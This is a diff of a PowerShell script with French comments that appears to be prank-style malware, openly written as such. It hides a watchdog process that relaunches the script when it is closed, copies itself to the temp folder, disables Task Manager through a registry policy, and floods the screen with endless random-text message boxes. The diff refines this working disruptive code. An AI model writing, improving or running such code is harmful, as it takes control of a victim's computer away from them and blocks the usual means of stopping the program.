@@ -11,11 +11,13 @@ public class WinAPI {
 }
 "@ -Language CSharp
 
+Add-Type -AssemblyName System.Windows.Forms
+
 $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/~`"
 $rand = New-Object System.Random
 $null = [System.Windows.Forms.Screen]::PrimaryScreen
 
-# Crée un processus PowerShell caché qui relance le script si tu essaies de le fermer
+# Crée un processus PowerShell caché pour relancer le script en cas de fermeture
 $scriptPath = "$env:TEMP\chaos.ps1"
 $lockScript = @"
 while (`$true) {
@@ -26,12 +28,13 @@ while (`$true) {
 $lockScript | Out-File -Encoding ASCII "$env:TEMP\lock.ps1"
 Start-Process -WindowStyle Hidden -FilePath "powershell" -ArgumentList "-ExecutionPolicy Bypass -File `"$env:TEMP\lock.ps1`""
 
+# Copie le script pour être relancé
 $MyInvocation.MyCommand.Path | Copy-Item -Destination $scriptPath -Force
 
-
-Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c taskkill /IM taskmgr.exe /F"
+# Désactive le Gestionnaire des tâches proprement
 Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f"
 
+# Génère des popups aléatoires en boucle
 while ($true) {
     Start-Job -ScriptBlock {
         param($chars, $rand)
@@ -39,7 +42,7 @@ while ($true) {
         $message = -join ((1..$rand.Next(10,30)) | ForEach-Object { $chars[$rand.Next($chars.Length)] })
         $handle = [WinAPI]::MessageBox([IntPtr]::Zero, $message, $title, 0)
         Start-Sleep -Milliseconds 100
-        $hWnd = [WinAPI]::FindWindow($null, $title)
+        $hWnd = [WinAPI]::FindWindow("", $title)
         if ($hWnd -ne [IntPtr]::Zero) {
             $x = $rand.Next(0, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width - 200)
             $y = $rand.Next(0, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height - 100)
